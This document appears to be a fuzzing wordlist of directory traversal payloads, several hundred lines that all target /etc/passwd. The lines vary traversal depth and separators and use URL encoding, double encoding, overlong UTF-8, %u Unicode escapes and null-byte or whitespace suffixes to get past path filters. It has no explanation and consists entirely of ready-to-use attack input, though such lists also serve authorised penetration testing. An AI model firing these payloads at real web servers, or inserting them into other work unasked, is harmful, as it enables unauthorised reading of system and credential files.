..\\..\\..\\etc\\passwd
..\\..\\..\\etc/passwd
..\\..\\..\\..\\etc\\passwd
..\\..\\..\\..\\etc/passwd
..\\..\\..\\..\\..\\etc\\passwd
..\\..\\..\\..\\..\\etc/passwd
..\\..\\..\\..\\../etc/passwd
..\\..\\..\\../etc/passwd
..\\..\\../etc/passwd
..\\../etc/passwd
..\/etc\/passwd
..\/etc/passwd
..\/..\/etc\/passwd
..\/..\/etc/passwd
..\/..\/..\/etc\/passwd
..\/..\/..\/etc/passwd
..\/..\/..\/..\/etc\/passwd
..\/..\/..\/..\/etc/passwd
..\/..\/..\/..\/..\/etc\/passwd
..\/..\/..\/..\/..\/etc/passwd
..\/..\/..\/..\/../etc/passwd
..\/..\/..\/../etc/passwd
..\/..\/../etc/passwd
..\/../etc/passwd
..\..\etc\passwd
..\..\etc/passwd
..\..\..\etc\passwd
..\..\..\etc/passwd
..\..\..\..\etc\passwd
..\..\..\..\etc/passwd
..\..\..\..\..\etc\passwd
..\..\..\..\..\etc/passwd
..\..\..\..\../etc/passwd
..\..\..\../etc/passwd
..\..\../etc/passwd
..\../etc/passwd
..;/etc/passwd
..;/../etc/passwd
..;/../../etc/passwd
..;/../../../etc/passwd
..;/../../../../etc/passwd
..;/../../../../../etc/passwd
..0x5cetc0x5cpasswd
..0x5cetc/passwd
..0x5c..0x5cetc0x5cpasswd
..0x5c..0x5cetc/passwd
..0x5c..0x5c..0x5cetc0x5cpasswd
..0x5c..0x5c..0x5cetc/passwd
..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd
..0x5c..0x5c..0x5c..0x5cetc/passwd
..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd
..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd
..0x5c..0x5c..0x5c..0x5c../etc/passwd
..0x5c..0x5c..0x5c../etc/passwd
..0x5c..0x5c../etc/passwd
..0x5c../etc/passwd
..0x2fetc0x2fpasswd
..0x2fetc/passwd
..0x2f..0x2fetc0x2fpasswd
..0x2f..0x2fetc/passwd
..0x2f..0x2f..0x2fetc0x2fpasswd
..0x2f..0x2f..0x2fetc/passwd
..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd
..0x2f..0x2f..0x2f..0x2fetc/passwd
..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd
..0x2f..0x2f..0x2f..0x2f..0x2fetc/passwd
..0x2f..0x2f..0x2f..0x2f../etc/passwd
..0x2f..0x2f..0x2f../etc/passwd
..0x2f..0x2f../etc/passwd
..0x2f../etc/passwd
../etc/passwd;index.html
../etc/passwd%FFindex.html
../etc/passwd%FF.jpg
../etc/passwd%FF
../etc/passwd%20index.html
../etc/passwd%20.jpg
../etc/passwd%20
../etc/passwd%0Dindex.html
../etc/passwd%0D.jpg
../etc/passwd%0D
../etc/passwd%09index.html
../etc/passwd%09.jpg
../etc/passwd%09
../etc/passwd%00index.html
../etc/passwd%00.jpg
../etc/passwd%00
../etc/passwd
..//etc/passwd
..//etc//passwd
..///etc/passwd
..///etc///passwd
..///../etc/passwd
..///..///etc/passwd
..///..///etc///passwd
..///..///../etc/passwd
..///..///..///etc/passwd
..///..///..///etc///passwd
..///..///..///../etc/passwd
..///..///..///..///etc/passwd
..///..///..///..///etc///passwd
..///..///..///..///../etc/passwd
..///..///..///..///..///etc/passwd
..///..///..///..///..///etc///passwd
..//../etc/passwd
..//..//etc/passwd
..//..//etc//passwd
..//..//../etc/passwd
..//..//..//etc/passwd
..//..//..//etc//passwd
..//..//..//../etc/passwd
..//..//..//..//etc/passwd
..//..//..//..//etc//passwd
..//..//..//..//../etc/passwd
..//..//..//..//..//etc/passwd
..//..//..//..//..//etc//passwd
../../etc/passwd;index.html
../../etc/passwd%FFindex.html
../../etc/passwd%FF.jpg
../../etc/passwd%FF
../../etc/passwd%20index.html
../../etc/passwd%20.jpg
../../etc/passwd%20
../../etc/passwd%0Dindex.html
../../etc/passwd%0D.jpg
../../etc/passwd%0D
../../etc/passwd%09index.html
../../etc/passwd%09.jpg
../../etc/passwd%09
../../etc/passwd%00index.html
../../etc/passwd%00.jpg
../../etc/passwd%00
../../etc/passwd
../../../etc/passwd;index.html
../../../etc/passwd%FFindex.html
../../../etc/passwd%FF.jpg
../../../etc/passwd%FF
../../../etc/passwd%20index.html
../../../etc/passwd%20.jpg
../../../etc/passwd%20
../../../etc/passwd%0Dindex.html
../../../etc/passwd%0D.jpg
../../../etc/passwd%0D
../../../etc/passwd%09index.html
../../../etc/passwd%09.jpg
../../../etc/passwd%09
../../../etc/passwd%00index.html
../../../etc/passwd%00.jpg
../../../etc/passwd%00
../../../etc/passwd
../../../../etc/passwd;index.html
../../../../etc/passwd%FFindex.html
../../../../etc/passwd%FF.jpg
../../../../etc/passwd%FF
../../../../etc/passwd%20index.html
../../../../etc/passwd%20.jpg
../../../../etc/passwd%20
../../../../etc/passwd%0Dindex.html
../../../../etc/passwd%0D.jpg
../../../../etc/passwd%0D
../../../../etc/passwd%09index.html
../../../../etc/passwd%09.jpg
../../../../etc/passwd%09
../../../../etc/passwd%00index.html
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00
../../../../etc/passwd
../../../../../etc/passwd;index.html
../../../../../etc/passwd%FFindex.html
../../../../../etc/passwd%FF.jpg
../../../../../etc/passwd%FF
../../../../../etc/passwd%20index.html
../../../../../etc/passwd%20.jpg
../../../../../etc/passwd%20
../../../../../etc/passwd%0Dindex.html
../../../../../etc/passwd%0D.jpg
../../../../../etc/passwd%0D
../../../../../etc/passwd%09index.html
../../../../../etc/passwd%09.jpg
../../../../../etc/passwd%09
../../../../../etc/passwd%00index.html
../../../../../etc/passwd%00.jpg
../../../../../etc/passwd%00
../../../../../etc/passwd
...\.\etc/passwd
...\.\...\.\etc/passwd
...\.\...\.\...\.\etc/passwd
...\.\...\.\...\.\...\.\etc/passwd
...\.\...\.\...\.\...\.\...\.\etc/passwd
.../etc/passwd
..././etc/passwd
..././..././etc/passwd
..././..././..././etc/passwd
..././..././..././..././etc/passwd
..././..././..././..././..././etc/passwd
.../.../etc/passwd
.../.../.../etc/passwd
.../.../.../.../etc/passwd
.../.../.../.../.../etc/passwd
..../etc/passwd
..../..../etc/passwd
..../..../..../etc/passwd
..../..../..../..../etc/passwd
..../..../..../..../..../etc/passwd
..%uF025etc/passwd
..%uF025etc%uF025passwd
..%uF025../etc/passwd
..%uF025..%uF025etc/passwd
..%uF025..%uF025etc%uF025passwd
..%uF025..%uF025../etc/passwd
..%uF025..%uF025..%uF025etc/passwd
..%uF025..%uF025..%uF025etc%uF025passwd
..%uF025..%uF025..%uF025../etc/passwd
..%uF025..%uF025..%uF025..%uF025etc/passwd
..%uF025..%uF025..%uF025..%uF025etc%uF025passwd
..%uF025..%uF025..%uF025..%uF025../etc/passwd
..%uF025..%uF025..%uF025..%uF025..%uF025etc/passwd
..%uF025..%uF025..%uF025..%uF025..%uF025etc%uF025passwd
..%uEFC8etc/passwd
..%uEFC8etc%uEFC8passwd
..%uEFC8../etc/passwd
..%uEFC8..%uEFC8etc/passwd
..%uEFC8..%uEFC8etc%uEFC8passwd
..%uEFC8..%uEFC8../etc/passwd
..%uEFC8..%uEFC8..%uEFC8etc/passwd
..%uEFC8..%uEFC8..%uEFC8etc%uEFC8passwd
..%uEFC8..%uEFC8..%uEFC8../etc/passwd
..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc/passwd
..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc%uEFC8passwd
..%uEFC8..%uEFC8..%uEFC8..%uEFC8../etc/passwd
..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc/passwd
..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8etc%uEFC8passwd
..%u2216etc/passwd
..%u2216etc%u2216passwd
..%u2216../etc/passwd
..%u2216..%u2216etc/passwd
..%u2216..%u2216etc%u2216passwd
..%u2216..%u2216../etc/passwd
..%u2216..%u2216..%u2216etc/passwd
..%u2216..%u2216..%u2216etc%u2216passwd
..%u2216..%u2216..%u2216../etc/passwd
..%u2216..%u2216..%u2216..%u2216etc/passwd
..%u2216..%u2216..%u2216..%u2216etc%u2216passwd
..%u2216..%u2216..%u2216..%u2216../etc/passwd
..%u2216..%u2216..%u2216..%u2216..%u2216etc/passwd
..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216passwd
..%u2215etc/passwd
..%u2215etc%u2215passwd
..%u2215../etc/passwd
..%u2215..%u2215etc/passwd
..%u2215..%u2215etc%u2215passwd
..%u2215..%u2215../etc/passwd
..%u2215..%u2215..%u2215etc/passwd
..%u2215..%u2215..%u2215etc%u2215passwd
..%u2215..%u2215..%u2215../etc/passwd
..%u2215..%u2215..%u2215..%u2215etc/passwd
..%u2215..%u2215..%u2215..%u2215etc%u2215passwd
..%u2215..%u2215..%u2215..%u2215../etc/passwd
..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd
..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd
..%e0%80%afetc/passwd
..%e0%80%afetc%e0%80%afpasswd
..%e0%80%af../etc/passwd
..%e0%80%af..%e0%80%afetc/passwd
..%e0%80%af..%e0%80%afetc%e0%80%afpasswd
..%e0%80%af..%e0%80%af../etc/passwd
..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd
..%e0%80%af..%e0%80%af..%e0%80%af../etc/passwd
..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd
..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%af../etc/passwd
..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd
..%c1%9cetc/passwd
..%c1%9cetc%c1%9cpasswd
..%c1%9c../etc/passwd
..%c1%9c..%c1%9cetc/passwd
..%c1%9c..%c1%9cetc%c1%9cpasswd
..%c1%9c..%c1%9c../etc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
..%c1%9c..%c1%9c..%c1%9c../etc/passwd
..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd
..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
..%c1%9c..%c1%9c..%c1%9c..%c1%9c../etc/passwd
..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd
..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
..%c0%afetc/passwd
..%c0%afetc%c0%afpasswd
..%c0%af../etc/passwd
..%c0%af..%c0%afetc/passwd
..%c0%af..%c0%afetc%c0%afpasswd
..%c0%af..%c0%af../etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c0%af..%c0%af..%c0%af../etc/passwd
..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c0%af..%c0%af..%c0%af..%c0%af../etc/passwd
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c0%80%5cetc/passwd
..%c0%80%5cetc%c0%80%5cpasswd
..%c0%80%5c../etc/passwd
..%c0%80%5c..%c0%80%5cetc/passwd
..%c0%80%5c..%c0%80%5cetc%c0%80%5cpasswd
..%c0%80%5c..%c0%80%5c../etc/passwd
..%c0%80%5c..%c0%80%5c..%c0%80%5cetc/passwd
..%c0%80%5c..%c0%80%5c..%c0%80%5cetc%c0%80%5cpasswd
..%c0%80%5c..%c0%80%5c..%c0%80%5c../etc/passwd
..%c0%80%5c..%c0%80%5c..%c0%80%5c..%c0%80%5cetc/passwd
..%c0%80%5c..%c0%80%5c..%c0%80%5c..%c0%80%5cetc%c0%80%5cpasswd
..%c0%80%5c..%c0%80%5c..%c0%80%5c..%c0%80%5c../etc/passwd
..%c0%80%5c..%c0%80%5c..%c0%80%5c..%c0%80%5c..%c0%80%5cetc/passwd
..%c0%80%5c..%c0%80%5c..%c0%80%5c..%c0%80%5c..%c0%80%5cetc%c0%80%5cpasswd
..%c0%5cetc/passwd
..%c0%5cetc%c0%5cpasswd
..%c0%5c../etc/passwd
..%c0%5c..%c0%5cetc/passwd
..%c0%5c..%c0%5cetc%c0%5cpasswd
..%c0%5c..%c0%5c../etc/passwd
..%c0%5c..%c0%5c..%c0%5cetc/passwd
..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd
..%c0%5c..%c0%5c..%c0%5c../etc/passwd
..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc/passwd
..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd
..%c0%5c..%c0%5c..%c0%5c..%c0%5c../etc/passwd
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc/passwd
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd
..%c0%2fetc/passwd
..%c0%2fetc%c0%2fpasswd
..%c0%2f../etc/passwd
..%c0%2f..%c0%2fetc/passwd
..%c0%2f..%c0%2fetc%c0%2fpasswd
..%c0%2f..%c0%2f../etc/passwd
..%c0%2f..%c0%2f..%c0%2fetc/passwd
..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd
..%c0%2f..%c0%2f..%c0%2f../etc/passwd
..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc/passwd
..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd
..%c0%2f..%c0%2f..%c0%2f..%c0%2f../etc/passwd
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc/passwd
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd
..%5cetc/passwd
..%5cetc%5cpasswd
..%5c../etc/passwd
..%5c..%5cetc/passwd
..%5c..%5cetc%5cpasswd
..%5c..%5c../etc/passwd
..%5c..%5c..%5cetc/passwd
..%5c..%5c..%5cetc%5cpasswd
..%5c..%5c..%5c../etc/passwd
..%5c..%5c..%5c..%5cetc/passwd
..%5c..%5c..%5c..%5cetc%5cpasswd
..%5c..%5c..%5c..%5c../etc/passwd
..%5c..%5c..%5c..%5c..%5cetc/passwd
..%5c..%5c..%5c..%5c..%5cetc%5cpasswd
..%2fetc/passwd
..%2fetc%2fpasswd
..%2f../etc/passwd
..%2f..%2fetc/passwd
..%2f..%2fetc%2fpasswd
..%2f..%2f../etc/passwd
..%2f..%2f..%2fetc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f../etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f..%2f../etc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%25c1%259cetc/passwd
..%25c1%259cetc%25c1%259cpasswd
..%25c1%259c../etc/passwd
..%25c1%259c..%25c1%259cetc/passwd
..%25c1%259c..%25c1%259cetc%25c1%259cpasswd
..%25c1%259c..%25c1%259c../etc/passwd
..%25c1%259c..%25c1%259c..%25c1%259cetc/passwd
..%25c1%259c..%25c1%259c..%25c1%259cetc%25c1%259cpasswd
..%25c1%259c..%25c1%259c..%25c1%259c../etc/passwd
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cetc/passwd
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cetc%25c1%259cpasswd
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c../etc/passwd
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cetc/passwd
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cetc%25c1%259cpasswd
..%25c0%25afetc/passwd
..%25c0%25afetc%25c0%25afpasswd
..%25c0%25af../etc/passwd
..%25c0%25af..%25c0%25afetc/passwd
..%25c0%25af..%25c0%25afetc%25c0%25afpasswd
..%25c0%25af..%25c0%25af../etc/passwd
..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd
..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd
..%25c0%25af..%25c0%25af..%25c0%25af../etc/passwd
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af../etc/passwd
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd
..%255cetc/passwd
..%255cetc%255cpasswd
..%255c../etc/passwd
..%255c..%255cetc/passwd
..%255c..%255cetc%255cpasswd
..%255c..%255c../etc/passwd
..%255c..%255c..%255cetc/passwd
..%255c..%255c..%255cetc%255cpasswd
..%255c..%255c..%255c../etc/passwd
..%255c..%255c..%255c..%255cetc/passwd
..%255c..%255c..%255c..%255cetc%255cpasswd
..%255c..%255c..%255c..%255c../etc/passwd
..%255c..%255c..%255c..%255c..%255cetc/passwd
..%255c..%255c..%255c..%255c..%255cetc%255cpasswd
..%252fetc/passwd
..%252fetc%252fpasswd
..%252f../etc/passwd
..%252f..%252fetc/passwd
..%252f..%252fetc%252fpasswd
..%252f..%252f../etc/passwd
..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f../etc/passwd
..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252f..%252f../etc/passwd
..%252f..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%%35%63etc/passwd
..%%35%63etc%%35%63passwd
..%%35%63../etc/passwd
..%%35%63..%%35%63etc/passwd
..%%35%63..%%35%63etc%%35%63passwd
..%%35%63..%%35%63../etc/passwd
..%%35%63..%%35%63..%%35%63etc/passwd
..%%35%63..%%35%63..%%35%63etc%%35%63passwd
..%%35%63..%%35%63..%%35%63../etc/passwd
..%%35%63..%%35%63..%%35%63..%%35%63etc/passwd
..%%35%63..%%35%63..%%35%63..%%35%63etc%%35%63passwd
..%%35%63..%%35%63..%%35%63..%%35%63../etc/passwd
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63etc/passwd
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63etc%%35%63passwd
..%%32%66etc/passwd
..%%32%66etc%%32%66passwd
..%%32%66../etc/passwd
..%%32%66..%%32%66etc/passwd
..%%32%66..%%32%66etc%%32%66passwd
..%%32%66..%%32%66../etc/passwd
..%%32%66..%%32%66..%%32%66etc/passwd
..%%32%66..%%32%66..%%32%66etc%%32%66passwd
..%%32%66..%%32%66..%%32%66../etc/passwd
..%%32%66..%%32%66..%%32%66..%%32%66etc/passwd
..%%32%66..%%32%66..%%32%66..%%32%66etc%%32%66passwd
..%%32%66..%%32%66..%%32%66..%%32%66../etc/passwd
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66etc/passwd
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66etc%%32%66passwd
%uff0e%uff0e/etc/passwd
%uff0e%uff0e/%uff0e%uff0e/etc/passwd
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2216etc/passwd
%uff0e%uff0e%u2216etc%u2216passwd
%uff0e%uff0e%u2216%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc/passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc/passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc/passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc/passwd
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd
%uff0e%uff0e%u2215etc/passwd
%uff0e%uff0e%u2215etc%u2215passwd
%uff0e%uff0e%u2215%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e/etc/passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
%u002e%u002e/etc/passwd
%u002e%u002e/%u002e%u002e/etc/passwd
%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
%u002e%u002e%u2216etc/passwd
%u002e%u002e%u2216etc%u2216passwd
%u002e%u002e%u2216%u002e%u002e/etc/passwd
%u002e%u002e%u2216%u002e%u002e%u2216etc/passwd
%u002e%u002e%u2216%u002e%u002e%u2216etc%u2216passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e/etc/passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216etc/passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216etc%u2216passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e/etc/passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216etc/passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216etc%u2216passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e/etc/passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216etc/passwd
%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216etc%u2216passwd
%u002e%u002e%u2215etc/passwd
%u002e%u002e%u2215etc%u2215passwd
%u002e%u002e%u2215%u002e%u002e/etc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215etc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e/etc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e/etc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e/etc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd
%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%e0%80%afetc/passwd
%e0%40%ae%e0%40%ae%e0%80%afetc%e0%80%afpasswd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/passwd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc%e0%80%afpasswd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/passwd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc%e0%80%afpasswd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/passwd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc%e0%80%afpasswd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/passwd
%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc%e0%80%afpasswd
%e0%40%ae%e0%40%ae%c0%80%5cetc/passwd
%e0%40%ae%e0%40%ae%c0%80%5cetc%c0%80%5cpasswd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cetc/passwd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cetc%c0%80%5cpasswd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cetc/passwd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cetc%c0%80%5cpasswd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cetc/passwd
